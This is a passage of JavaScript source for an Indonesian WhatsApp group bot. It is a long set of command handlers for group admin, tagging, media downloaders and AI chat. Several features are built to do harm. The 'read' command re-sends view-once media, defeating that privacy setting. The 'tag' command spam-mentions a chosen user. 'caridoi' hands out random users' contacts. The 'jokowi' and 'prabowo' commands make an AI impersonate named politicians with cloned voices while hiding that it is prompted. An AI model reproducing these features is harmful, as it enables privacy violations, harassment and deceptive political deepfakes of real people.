	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await hanz.sendMessage(from, { image: { url: ppimg }}, { quoted: m })
	break
 case 'delppgc': {
   if (!isGroup) return onlyToko()
   if (!isGroupAdmins) return onlyAdmin()
   if (!isBotGroupAdmins) return onlyBadmin()
    await hanz.removeProfilePicture(from)
    }
    break
case 'setnamegc':
    if (!isGroup) return onlyToko()
    if (!isGroupAdmins) return onlyAdmin()
    if (!isBotGroupAdmins) return onlyBadmin()
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await hanz.groupUpdateSubject(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break

case 'setdesc':
if (!isGroup) return onlyToko()
if (!isGroupAdmins) return onlyAdmin()
if (!isBotGroupAdmins) return onlyBadmin()
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await hanz.groupUpdateDescription(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'inspect':{
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let nana = await hanz.groupGetInviteInfo(code)
//console.log(nana)
let { id, subject,creator,creation,desc,descId } = await hanz.groupGetInviteInfo(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text = Ehztext(
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`)
setReply(text)

}
break
case 'linkgroup': case 'linkgc':{
if (!isOwner && !isGroupAdmins) return onlyAdmin()
if (!m.isGroup) return onlyToko()
if (!isBotGroupAdmins) return onlyBadmin()
let response = await hanz.groupInviteCode(from)
hanz.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'revoke': case 'resetlinkgc':{
  if (!isOwner && !isGroupAdmins) return onlyAdmin()
  if (!m.isGroup) return onlyToko()
  if (!isBotGroupAdmins) return onlyBadmin()
hanz.groupRevokeInvite(from)
}
break
    case 'opentime':
    if (!isGroupAdmins) return onlyAdmin()
    if (!isBotGroupAdmins) return onlyBadmin()
    if (args[1]=="detik") {var timer = args[0]*`1000`
    } else if (args[1]=="menit") {var timer = args[0]*`60000`
    } else if (args[1]=="jam") {var timer = args[0]*`3600000`
    } else if (args[1]=="hari") {var timer = args[0]*`86400000`
    } else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
    setReply(`Open time ${q} dimulai dari sekarang`)
    setTimeout( () => {
    const open = Ehztext(`*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`)
    hanz.groupSettingUpdate(from, 'not_announcement')
    setReply(open)
    }, timer)
    break
    case 'closetime':{
if (!isGroup) return onlyToko()
if (!isGroupAdmins) return onlyAdmin()
//if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply(`Contoh : ${prefix}closetime 5 detik`)}
let ko = await hanz.sendMessage(from, { text:`Close time ${q} dimulai dari sekarang`}, {quoted: m})
setTimeout(() => deleteMessage(ko), 5000)

setTimeout( () => {
const tutup = Ehztext(`*Tepat waktu* grup ditutup oleh admin\n sekarang hanya admin yang dapat mengirim pesan`)
hanz.groupSettingUpdate(from, 'announcement')
  setReply(tutup)
}, timer)
}
break 
case 'gc':
if (!isGroup) return onlyToko()
if (!isGroupAdmins) return onlyAdmin()
//if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if (!q) return setReply(`Contoh : ${command} close/open`)
if (args[0] == "close") {
hanz.groupSettingUpdate(from, 'announcement')

} else if (args[0] == "open") {
hanz.groupSettingUpdate(from, 'not_announcement')
} else {
setReply(`Contoh : ${command} close/open`)
}
break
 
case 'tag':
{
    if (!isGroup) return onlyToko();
    
    let tagQueue = {}; // Menyimpan antrian tag untuk setiap pengguna
    const target = args[0];
    const amount = parseInt(args[1]); // Jumlah tag yang ingin dikirim

    // Fungsi untuk mengirim tag berikutnya
    async function sendNextTag(user) {
        if (tagQueue[user] && tagQueue[user].currentIndex < tagQueue[user].amount) {
            const currentIndex = tagQueue[user].currentIndex;

            // Mengirim tag berikutnya
            hanz.sendMessage(from, { text: `${target}`, mentions: [target] });
            
            // Menambahkan 1 ke currentIndex dan menjalankan pengiriman tag selanjutnya setelah jeda
            tagQueue[user].currentIndex++;
            setTimeout(() => {
                sendNextTag(user);
            }, 1000); // Jeda 1 detik
        } else {
            // Menghapus antrian tag setelah selesai
            delete tagQueue[user];
        }
    }

    if (!target || !amount || isNaN(amount) || amount <= 0) {
        return hanz.sendMessage(from, { text: 'Gunakan: .tag *@user* *jumlah* (misal: tag @user 3)' });
    }

    // Membuat antrian tag untuk pengguna
    tagQueue[sender] = {
        target,
        amount,
        currentIndex: 0
    };  

    // Memulai pengiriman tag bergilir
    sendNextTag(sender);
}
break;



case 'hidetag':
if (!isGroup) return onlyToko()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
let mem = [];
groupMembers.map( i => mem.push(i.id) )
hanz.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'tagall':{
if (!isGroup) return onlyToko()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
//if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!q) {
var inpo = `I love you`+readmore+`tube :v`
} else var inpo = q 
let members_id = []
let tes = '\n'
await groupMembers.map( i => {
tes += `• @${i.id.split('@')[0]}\n`
members_id.push(i.id) })
mentions(`${inpo}
`+tes+``, members_id, false)
}
break 
case 'd':
case 'delchat':
case 'del':
case 'delete':{
if (!isGroup) return onlyToko()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
//if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
Log(chatUpdate)
if (!mentionByReply) return setReply("Reply pesan")
if (mentionByReply == botNumber) {
hanz.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
} else if(mentionByReply !== botNumber && isBotGroupAdmins){
hanz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: mentionByReply } })
} 
}
break
    case 'jid':{
      setReply(from)
     }
    break
case 'listonline': {
    if (!isGroup) return onlyToko();
    
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from;
    
    // Cek apakah store.presences[id] ada
    if (!store.presences || !store.presences[id]) {
        return hanz.reply(from, 'Tidak ada data online untuk grup ini.', m);
    }
    
    // Mendapatkan daftar online
    let online = [...Object.keys(store.presences[id]), botNumber];
    
    // Mengirim daftar online dengan mention
    hanz.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join('\n'), m, { mentions: online });
}
break;

        case 'caridoi':
        case 'cariteman':{
        let userny = Object.values(db.data.users);
        let teman = pickRandom(userny)
        let namTemen = teman.name
        let nomerTemen = teman.id
        setTimeout(() => {
        setReply('Sedang mencari....')
        }, 1000)
        setTimeout(() => {
        setReply('Berhasil mendapatkan satu org')
        }, 5000)
        setTimeout(() => {
        hanz.sendContact(from, nomerTemen, namTemen, m)
        }, 9000)
        }
        break
case 'jadian': {
if (!isGroup) return onlyToko()
let member = groupMembers.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang jadian ❤️ Jangan lupa pajak jadiannya yee

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
hanz.sendMessage(from, { text: jawab, mentions: menst },{quoted: m}) 
}
break
case 'jodohku':{
if (!isGroup) return onlyToko()
let member = groupMembers.map(u => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Jodoh kamu adalah @${jodoh.split('@')[0]}`
let menst = [jodoh]
hanz.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
  case 'getpp':{
if (!isGroup) return setReply ("Digunakan Khsus Dalam Group")
if(isQuotedTag || isQuotedReply ){
if (m.message.extendedTextMessage === null || m.message.extendedTextMessage === undefined) return setReply ('Reply targetnya kak atau Tag')
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await hanz.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
hanz.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
}
break 
case 'getname': 
    if (isGroup) {
    
console.log(users)
const sname = await hanz.getName(users)
setReply(sname)
} else if(!isGroup) {
const yahu = await hanz.getName(users)
setReply(yahu)
} else{
setReply("Reply targetnya")
}
break

case 'read': {
const { downloadContentFromMessage } = require('baileys')
	if (!m.quoted) return setReply(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return setReply(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return hanz.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return hanz.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'afk':{
    if (!isGroup) return onlyToko()
    if (!q) return setReply("Alasan afk afa ?")
    let me = m.sender
  let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || 'lamanya'
    let user = global.db.data.users[m.sender]
    user.afk = + new Date
    user.afkReason = q
        
    let afkMessage = `🚨 *${pushname} sekarang dalam mode AFK!* 🚨\n` +
                     `🔹 *Alasan*: ${q ? q : 'Tidak ada alasan khusus.'}\n` +
                     `⏳ *Kamu akan dianggap AFK hingga kembali aktif.*`;
    hanz.sendMessage(m.chat, { text: afkMessage }, { quoted: fkontak });

}
break



  case 'contag': {
 const froms = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : false; 
 if (froms) {
 if (db && db.users && db.users.hasOwnProperty(froms)) {
 sendContact3(db.users[froms].name, froms, m);
 } else {
 const name = await hanz.getName(froms);
  hanz.sendContact(name, froms, m);
 }
 } else {
 m.reply('Tag pengguna yang ingin dikirimkan kontaknya!');
 } 
 function sendContact3(name, jid, m) {
 let sngContact = {
 displayName: `ini namanya ${name}`,
 contacts: [{
 displayName: name,
 vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${name};;;\nFN:${name}\nitem1.TEL;waid=${jid.split('@')[0]}:${jid.split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`
 }]
 };
 
 hanz.sendMessage(m.chat, { contacts: sendContact3, mentions: [jid] }, { ephemeralExpiration: 86400 });
 }
}
break
// ========== FITUR KEAMANAN ========//
 case 'banstik':{
if(!isOwner) return onlyOwner()
if(!mentionByReply) return setReply("Reply pesan")
if (mentionByReply == botNumber) {
hanz.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
} else if(mentionByReply !== botNumber && isBotGroupAdmins){
hanz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: mentionByReply } })
}

if(!isQuotedSticker) return setReply("Reply stickernya")
let sticker = m.quoted.fileSha256.toString('base64')
if(antiSticker.includes(sticker)) return setReply("sudah ada di database")
antiSticker.push(sticker)
setReply("Sukses")
}
break

case 'unbanstik':
case  'delantistik':{
if(!isOwner) return onlyOwner()
if(!isQuotedSticker) return setReply("Reply stickernya")
let sticker = m.quoted.fileSha256.toString('base64')
if(!antiSticker.includes(sticker)) return setReply("Tidak ada di database")
antiSticker.splice(antiSticker.indexOf(sticker, 1))
setReply("Sukses")
}
break   


// ========== FITUR DOWNLOAD =========//
/*case 'play': {

    if (!isGroup) return onlyToko();
    if (!q) return setReply("Masukkan judul lagu atau link YouTube untuk diputar.");
    try {
        sendSticker(otw);
const xyz = require("@xyzteams/scapers")
        const searchResults = await xyz.download.youtube.search(q);
        if (!searchResults || searchResults.length === 0) {
            return setReply("Hasil tidak ditemukan, coba periksa kata kunci atau link yang dimasukkan.");
        }
        const data = searchResults[0];
        if (data.duration.seconds > 600) {
            return setReply("Durasi maksimal adalah 10 menit.");
        }
        await hanz.sendMessage(
            m.chat,
            {
                text: `🎶 *Title:* ${data.title}\n⏳ *Duration:* ${
                    data.duration.timestamp
                }\n📅 *Uploaded on:* ${
                    data.publish ? data.publish : "Unknown"
                }\n👁️ *Views:* ${data.views}\n🖼️ *Thumbnail:* ${
                    data.thumbnail
                }\n\n📥 *Downloading...*`,
                contextInfo: {
                    externalAdReply: {
                        title: "Now Playing",
                        body: `Duration: ${data.duration.timestamp}`,
                        thumbnailUrl: data.thumbnail,
                        sourceUrl: null,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                    },
                },
            },
            { quoted: m }
        );
        const downloadData = await xyz.download.youtube.ytmp3(data.url);
        if (!downloadData.url) {
            return setReply("Tidak dapat mengunduh audio. Coba lagi nanti.");
        }
        await hanz.sendMessage(
            m.chat,
            {
                audio: { url: downloadData.url },
                mimetype: "audio/mp4",
            },
            { quoted: m }
        );

    } catch (error) {
        console.error(error);
        setReply("Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.");
    }
}*/
break;
case 'mediafire': case 'mfdl':
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
  if (args.length < 1) return reply(`Kirim perintah ${command} link`)        
 setReply (mess.wait)                   
  mediafiredll(q).then(async(data) => {
  let tuks =`*---------[ Data Berhasil Diperoleh ]---------*

File Name : ${data.name}
File Size : ${data.size}
Mime : ${data.mime}
Upload : ${data.date}
Link : ${data.link}
`
 reply (tuks)
console.log(data)
 var media = await getBuffer(data.link)
 await hanz.sendMedia (from, media, m, {fileName: data.name})                    
}).catch(() => setReply ('Sedang erorr coba lgi nanti'))
db.data.users[sender].limit -= 1 // -1 limit
break
case 'tt': case 'tiktok': case 'ttnowm': case 'tiktoknowm': { 
    try {  
 
        if (!isGroup) return onlyToko();
        if (!isPremium && global.db.data.users[sender].limit < 1) {
            return onlyLimit() // Respon ketika limit habis
        }
        if (!isUrl) return setReply(`⚠️ Masukkan link TikTok yang valid!\n\nContoh: ${prefix + command} https://vm.tiktok./HJSJA`);
        if (args.length < 1) return setReply(`⚠️ Link TikTok?\n\nContoh: ${prefix + command} https://vm.tiktok.com/ZS`);
        sendSticker(otw);
        let data = await fetchJson(`https://skizoasia.xyz/api/tiktok?url=${q}&apikey=Rangelofficial`);
        if (data.data.duration == 0) {
            for (let i of data.data.images) {
                await sleep(1500); 
                await hanz.sendMedia(from, i, m); 
            }
        } else {
            // Format pesan lebih rapi dan menarik
            let tkes = ` ${gris1}*乂 Tiktok Downloader*\n\n` +
                       `📌 *ID:* ${data.data.id}\n` +
                       `🌍 *Region:* ${data.data.region}\n` +
                       `🎬 *Judul:* ${data.data.title}\n` +
                       `⏱️ *Durasi:* ${data.data.duration} detik\n` +
                       `🎵 *Musik:* ${data.data.music}\n\n` +
                       `🎼 *Info Musik:*\n` +
                       `🎤 *Judul:* ${data.data.music_info.title}\n` +
                       `🎧 *Author:* ${data.data.music_info.author}\n\n` +
                       `📊 *Statistik Video:*\n` +
                       `👁️ *Ditonton:* ${h2k(data.data.play_count)} kali\n` +
                       `💬 *Komentar:* ${data.data.comment_count}\n` +
                       `🔗 *Dibagikan:* ${data.data.share_count} kali\n` +
                       `📥 *Didownload:* ${data.data.download_count} kali${gris1} `;
            await hanz.sendMessage(from, {video: {url: data.data.play}, caption: tkes}, {quoted: m});
        }
        let dataTt = await fetchJson(`https://skizo.tech/api/tiktok?url=${q}&apikey=Rangelofficial`);
        await sleep(1000); 
        await hanz.sendMessage(from, { audio: {url: dataTt.data.music}, mimetype: 'audio/mp4'}, { quoted: fkontak });
    } catch (err) {
        console.log(err);
    }
    db.data.users[sender].limit -= 1;
    break;
}
case 'tiktokmusik': case 'ttmp3': case 'ttaudio': {       
    try {  
        if (!isGroup) return onlyToko();
        if (!isPremium && global.db.data.users[sender].limit < 1) {
            return onlyLimit()// Respon ketika limit habis
        }
        if (!isUrl) return setReply(`⚠️ Masukkan link TikTok yang valid!\n\nContoh: ${prefix + command} https://vm.tiktok.com/ZSRfArwXH/`);
        if (args.length < 1) return setReply(`⚠️ Link TikTok?\n\nContoh: ${prefix + command} https://vm.tiktok.com/ZSRfArwXH/`);
        await loading();
        let data = await fetchJson(`https://skizoasia.xyz/api/tiktok?url=${q}&apikey=Rangelofficial`);
        if (data.data.duration == 0) {
            for (let i of data.data.images) {
                await sleep(2000);
                await hanz.sendMedia(from, i, m); //
            }
        } else {
            // Format pesan musik yang lebih menarik
            let tkes = `${gris1}*🎵 TIKTOK MUSIK 🎵*\n\n` +
                       `🎬 *ID:* ${data.data.id}\n` +
                       `🌍 *Region:* ${data.data.region}\n` +
                       `🎧 *Judul:* ${data.data.title}\n` +
                       `⏱️ *Durasi:* ${data.data.duration} detik\n` +
                       `🎶 *Musik:* ${data.data.music}\n\n` +
                       `🎼 *Info Musik:*\n` +
                       `🎤 *Judul:* ${data.data.music_info.title}\n` +
                       `🎧 *Author:* ${data.data.music_info.author}\n\n` +
                       `📊 *Statistik Musik:*\n` +
                       `👁️ *Diputar:* ${h2k(data.data.play_count)} kali\n` +
                       `💬 *Komentar:* ${data.data.comment_count}\n` +
                       `🔗 *Dibagikan:* ${data.data.share_count} kali\n` +
                       `📥 *Didownload:* ${data.data.download_count} kali${gris1}`;
            let lagu = await hanz.sendMessage(from, { audio: {url: data.data.music}, mimetype: 'audio/mp4'}, { quoted: m });
            await hanz.sendMessage(from, { text: tkes }, { quoted: lagu });
        }
    } catch (err) {
        // Jika terjadi error, kirim pesan error loading
        await console.log(err);
    }
    break;
}

case 'gdrive': {
if (!isGroup) return onlyToko()
  await loading()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
const { sizeFormatter } = await import( 'human-readable')
let image = { url : "https://telegra.ph/file/980b0d179669359c650f3.jpg"}
let formatSize = sizeFormatter({
std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`
})
	
async function GDriveDl(url) {
let id
if (!(url && url.match(/drive\.google/i))) return setReply( 'Link gdrivenya mana ?')
id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
if (!id) return setReply( 'ID Not Found')
let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
method: 'post',
headers: {
'accept-encoding': 'gzip, deflate, br',
'content-length': 0,
'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
'origin': 'https://drive.google.com',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
'x-drive-first-party': 'DriveWebUi',
'x-json-requested': 'true'
}
})
let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
if (!downloadUrl) return setReply( 'Link Download Limit!')
let data = await fetch(downloadUrl)
if (data.status !== 200) throw data.statusText
return { downloadUrl, fileName, fileSize: formatSize(sizeBytes), mimetype: data.headers.get('content-type') }
}
	
if (!q) return setReply( 'Input URL' )

GDriveDl(args[0]).then(async (res) => {
let teks = `*乂 Gdrive Downloader*

📂 File Name : ${res.fileName}
📄 File Size : Not Found
🌐 Mimetype : ${res.mimetype}

*_Tunggu sebentar ya kak sedang mengirim File!_*`	
	
const contextInfo = {
mentionedJid: [sender],
externalAdReply:{
showAdAttribution: true, 
title: `${week} , ${calender}`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: image.url,
sourceUrl: `${res.downloadUrl}`
}
}  
hanz.sendMessage(from ,{ text : teks, contextInfo},{quoted:m})
await sleep(1000)
hanz.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
})
db.data.users[sender].limit -= 1 
}
break
// ========== FITUR AI ===========//
case 'ngel': {
  if (!q) {
    return m.reply("Ada yang bisa Ngel bantu?");
  }

  const subCommand = args.join(" ").toLowerCase(); // Gabungkan semua argumen menjadi satu string dan jadikan huruf kecil

  // Proses subcommand untuk 'ppcp' atau 'ppcouple'
  if (subCommand.includes("ppcp") || subCommand.includes("ppcouple")) {
    if (!isGroup) return onlyToko(); // Pastikan ini dijalankan di grup
    await loading(); // Fungsi loading untuk memproses
    
    try {
      let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json');
      let random = anu[Math.floor(Math.random() * anu.length)];

      // Kirim gambar couple male
      hanz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m });

      // Kirim gambar couple female
      hanz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m });

    } catch (error) {
      console.error("Terjadi kesalahan saat mengambil data:", error);
      m.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }

  } else if (subCommand.includes("play")) {  // Tambahkan logika untuk play
    if (!isGroup) return onlyToko();
    if (!q) return m.reply("Masukkan judul lagu atau link YouTube untuk diputar.");
    
    try {
      sendSticker(otw);
      const xyz = require("@xyzteams/scapers");
      const searchResults = await xyz.download.youtube.search(q);
      if (!searchResults || searchResults.length === 0) {
        return m.reply("Hasil tidak ditemukan, coba periksa kata kunci atau link yang dimasukkan.");
      }
      const data = searchResults[0];
      if (data.duration.seconds > 600) {
        return m.reply("Durasi maksimal adalah 10 menit.");
      }
      
      await hanz.sendMessage(
        m.chat,
        {
          text: `🎶 *Title:* ${data.title}\n⏳ *Duration:* ${data.duration.timestamp}\n📅 *Uploaded on:* ${data.publish ? data.publish : "Unknown"}\n👁️ *Views:* ${data.views}\n🖼️ *Thumbnail:* ${data.thumbnail}\n\n📥 *Downloading...*`,
          contextInfo: {
            externalAdReply: {
              title: "Now Playing",
              body: `Duration: ${data.duration.timestamp}`,
              thumbnailUrl: data.thumbnail,
              sourceUrl: null,
              mediaType: 1,
              renderLargerThumbnail: true,
            },
          },
        },
        { quoted: m }
      );

      const downloadData = await xyz.download.youtube.ytmp3(data.url);
      if (!downloadData.url) {
        return m.reply("Tidak dapat mengunduh audio. Coba lagi nanti.");
      }

      await hanz.sendMessage(
        m.chat,
        {
          audio: { url: downloadData.url },
          mimetype: "audio/mp4",
        },
        { quoted: m }
      );

    } catch (error) {
      console.error(error);
      m.reply("Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.");
    }

  } else if (subCommand.includes("self")) { // Tambahkan logika untuk self
    if (!isOwner) return onlyOwner();
    if (publik == false) return m.reply('Udah di mode self kak');
    publik = false;
    let breh = `Mode self aktif kak`;
    setReply(breh);
  } else if (subCommand.includes("public")) { // Tambahkan logika untuk public
    if (!isOwner) return onlyOwner();
    if (publik) return m.reply('Udah di mode public kak');
    publik = true;
    let bab = `Mode public aktif kak`;
    setReply(bab);
  } else {
    // Jika tidak ada fitur tertentu, lanjutkan ke obrolan menggunakan API Widipe
    const url = `https://widipe.com/openai?text=${encodeURIComponent(q)}`;

    try {
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      
      const data = await response.json();

      // Kirim hasil dari Widipe API ke pengguna
      hanz.sendMessage(m.chat, { text: data.result }, { quoted: m });

    } catch (error) {
      console.error("Terjadi masalah saat mengambil data dari Widipe:", error);
      m.reply("Maaf, terjadi kesalahan saat memproses permintaan obrolan.");
    }
  }

  break;
}
case 'jokowi': {
    if (!q) {
        return m.reply(`*Contoh:* ${prefix + command} Haii, Perkenalkan Dirimu`);
    }

    const formData = new URLSearchParams();
    formData.append("locale", "id-ID");

    try {
        // Mengambil jawaban dari server AI
        const responseFromAI = await axios.post('https://luminai.my.id/', {
            content: q, // Use the query 'q' as the text input
            user: m.sender,
            prompt: `Anda adalah Joko Widodo, Presiden Republik Indonesia yang berwibawa dan rendah hati. Sebagai pemimpin, berbicaralah dengan keyakinan dan kebijaksanaan, menunjukkan kepintaran dan kecerdasanmu yang setara dengan AI. Anda merupakan sosok yang sangat berpengaruh di tanah air, dengan visi dan misi yang jelas untuk memajukan bangsa. Dalam setiap pernyataanmu, pastikan untuk tidak menyebutkan bahwa ini adalah hasil dari sebuah prompt. Ingatlah, Anda adalah representasi dari harapan dan aspirasi rakyat, dan Anda memiliki dukungan dari Ehanz dan perusahaan Rangelofficial yang mendorong inovasi dan kemajuan. Dan Ehanz atau Raihan Fadillah adalah salah satu pendiri, yaitu yang mempunyai perusahaan Rangelofficial dan Ehzstore.`
        });

        // Extract the result from the response
        const aiResponse = responseFromAI.data.result; // Assuming 'result' contains the response text

        // TTS API request for Jokowi's voice
        const ttsUrl = `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${encodeURIComponent(aiResponse)}&key=${apiTermai}&voice=jokowi`;

        const audioResponse = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
        if (!audioResponse) throw new Error('Gagal mengambil audio TTS');

        // Send the audio message with Jokowi's voice
        hanz.sendMessage(m.chat, { audio: Buffer.from(audioResponse.data), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });

    } catch (error) {
        console.error('Terjadi kesalahan:', error);
        m.reply('Terjadi kesalahan saat memproses permintaan Anda. Limit pemakaian API sudah habis. Tunggu hingga API dapat digunakan kembali.');
    }
}
break;

case 'prabowo': {
    if (!q) {
        return m.reply(`*Contoh:* ${prefix + command} Haii, Perkenalkan Dirimu`);
    }

    const formData = new URLSearchParams();
    formData.append("locale", "id-ID");

    try {
        // Mengambil jawaban dari server AI
        const responseFromAI = await axios.post('https://luminai.my.id/', {
            content: q, // Use the query 'q' as the text input
            user: m.sender,
            prompt: `Anda adalah Prabowo Subianto, seorang calon presiden Republik Indonesia yang karismatik dan tegas. Sebagai pemimpin, berbicaralah dengan keyakinan dan kebijaksanaan, menunjukkan kepintaran dan kecerdasanmu yang setara dengan AI. Anda merupakan sosok yang sangat berpengaruh di tanah air, dengan visi dan misi yang jelas untuk memajukan bangsa. Dalam setiap pernyataanmu, pastikan untuk tidak menyebutkan bahwa ini adalah hasil dari sebuah prompt. Ingatlah, Anda adalah representasi dari harapan dan aspirasi rakyat, dan Anda memiliki dukungan dari Ehanz dan perusahaan Rangelofficial yang mendorong inovasi dan kemajuan Dan Ehanz Atau Raihan Fadillah Adalah Salah Satu Pendiri Yaitu yang mempunyai perusahaan Rangelofficial dan Ehzstore`
        });

        // Extract the result from the response
        const aiResponse = responseFromAI.data.result; // Assuming 'result' contains the response text

        // TTS API request for Prabowo's voice
        const ttsUrl = `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${encodeURIComponent(aiResponse)}&key=${apiTermai}&voice=prabowo`;

        const audioResponse = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
        if (!audioResponse) throw new Error('Gagal mengambil audio TTS');

        // Send the audio message with Prabowo's voice
        hanz.sendMessage(m.chat, { audio: Buffer.from(audioResponse.data), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });

    } catch (error) {
        console.error('Terjadi kesalahan:', error);
        m.reply('Terjadi kesalahan saat memproses permintaan Anda. Limit pemakaian API sudah habis. Tunggu hingga API dapat digunakan kembali.');
    }
}
break;

        

 //===≠===== FITUR ANIME ===========//
case 'ppcp': case ' ppcouople': {
if (!isGroup) return onlyToko()
          await loading()
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                hanz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                hanz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break	    

case 'loli':
  case 'cosplay': 
  case 'husbu':
  case 'milf':
case 'wallml':{
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].limit < 1) return setReply(mess.limit)
	
m.reply(mess.wait)//let data = global.db.data.others['runtime']
//let time = (new Date - data.runtime) || "Tidak terdeteksi" 
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)                             
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: wm, mediaType: 3,  renderLargerThumbnail : false,thumbnail:thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: kentir, caption: `_${command}_` ,footer: `Hasil pencarian dari ${command}`}, { quoted: m })
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1 
}
break
case 'jadianime':
case 'toanime':{
    if (!isGroup) return onlyToko();
    if (!isImage && !isQuotedImage) return setReply(`Kirim gambar lalu reply ${prefix + command} atau tag gambar yang sudah dikirim.`);
    
    reply(mess.wait)

    try {
        const uploadImage = require('../lib/uploadImage');
        let mediaPath = await hanz.downloadAndSaveMediaMessage(quoted); // Mengunduh gambar yang di-quote
